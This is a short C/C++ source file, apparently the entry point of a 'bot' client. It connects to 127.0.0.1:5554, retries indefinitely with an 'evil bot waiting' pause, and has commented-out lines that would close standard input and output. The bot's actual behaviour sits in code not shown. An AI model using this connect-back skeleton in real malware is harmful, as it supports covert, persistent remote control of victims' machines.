#include <stdio.h>
#include <netinet/in.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/socket.h>

#include "tcp_client.hpp"

#define ATTEMPTS_MAX 10

#define IDLE_BETWEEN_CONNECT 1000000

#define TARGET_IP (char*)"127.0.0.1"
#define TARGET_PORT (char*)"5554"

int
main(int argc, char *argv[])
{
	BOT *bot;
	bool ret;
	int i;

	//close unusible fds
	//close(0);
	//close(1);

	bot = new BOT();

	if (bot->set_ip(TARGET_IP) == false)
		goto err;

	if (bot->set_port(TARGET_PORT) == false)
		goto err;
	
	i = 0;
	while (1) {
		ret = bot->init_connection();
		
		if (ret == true)
			break;

		i++;
		if (i > ATTEMPTS_MAX) {
			//evil bot waiting...
			i = 0;
			sleep(60);
		}

		usleep(IDLE_BETWEEN_CONNECT);
	}

	if (bot->main_loop() == false) {
		printf("main loop ended with some errors\n");
		goto err;
	}
	
	bot->close_connection();

	delete bot;

	return 0;

err:
	delete bot;

	return 1;
}

